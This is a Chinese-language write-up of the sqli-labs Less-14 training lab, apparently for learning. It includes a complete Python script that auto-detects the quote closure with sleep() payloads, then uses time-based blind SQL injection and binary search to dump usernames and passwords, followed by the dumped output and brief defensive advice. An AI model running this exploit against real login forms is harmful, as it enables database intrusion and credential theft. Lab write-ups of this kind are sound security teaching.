## 题目: Sqli-labs Less-14

## 题目描述
本关是一个登录框页面，标题为 `Double Injection - String`。没有数据回显，也没有直接的报错信息。

## 解题思路
既然常规报错无效，我们使用**时间盲注**。但这关的难点在于**闭合符不明确**。为了防止盲目猜测导致 Payload 语法错误，我们编写了一个**“全自动探测闭合符”**的 Python 脚本。先利用 `sleep(3)` 测试出真实的闭合方式，再使用二分法进行数据爆破。

## 解题步骤
**1. 编写全自动探测与盲注脚本**

**实战 Payload 核心代码**：

```python
import requests
import time

url = "http://127.0.0.1/sqli-labs/Less-14/"
query = "(select group_concat(username,0x3a,password) from users)"
result = ""

# 准备所有可能的闭合符
prefixes = ["admin')", 'admin")', "admin'", 'admin"']
valid_prefix = None

print("正在自动探测正确的闭合符，请稍候...")

# 1. 自动探测闭合符
for p in prefixes:
    payload = p + " and sleep(3) #"
    data = {'uname': payload, 'passwd': '1', 'submit': 'Submit'}
    
    start_time = time.time()
    try:
        requests.post(url, data=data, timeout=5)
        if time.time() - start_time >= 2.5:
            print(f"[+] 探测成功！正确的闭合符是: {p}")
            valid_prefix = p
            break
    except Exception:
        pass

if not valid_prefix:
    exit("[-] 探测失败，请检查环境。")

# 2. 开始正式爆破
print("\n开始时间盲注爆破...")

for i in range(1, 100):
    low = 32
    high = 127
    
    while low <= high:
        mid = (low + high) // 2
        # 使用探测到的正确闭合符
        payload = f'{valid_prefix} and if(ascii(substr({query},{i},1))>{mid},sleep(3),0) #'
        data = {'uname': payload, 'passwd': '1', 'submit': 'Submit'}
        
        start_time = time.time()
        try:
            requests.post(url, data=data, timeout=10)
            elapsed = time.time() - start_time
        except Exception:
            continue
            
        if elapsed >= 2.5:
            low = mid + 1
        else:
            high = mid - 1
            
    # 遇到空格或空字符则停止
    if low == 32 or low == 0 or low == 127:
        break
        
    char = chr(low)
    result += char
    print(f"[+] 爆出第 {i} 个字符: {char} | 当前结果: {result}")

print(f"\n================ 最终结果 ================\n{result}\n==========================================")
```

**3. 运行结果**
脚本自动探测出正确的闭合符（如 admin")），随后成功爆出：
```text
Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious...
```

## 知识点总结
* 动态探测闭合符：这是高级自动化脚本的必修课。面对未知的闭合符，利用延时函数（sleep）或者布尔状态（True/False）进行黑盒测试是最稳妥的。
* 时间盲注的局限：时间盲注极度依赖网络和服务器响应速度，非常耗时，仅在无法使用报错或联合查询时作为最终手段。
* 防御策略：使用 PDO 预编译（彻底解决闭合符问题）；限制数据库执行时间（如 max_execution_time）。
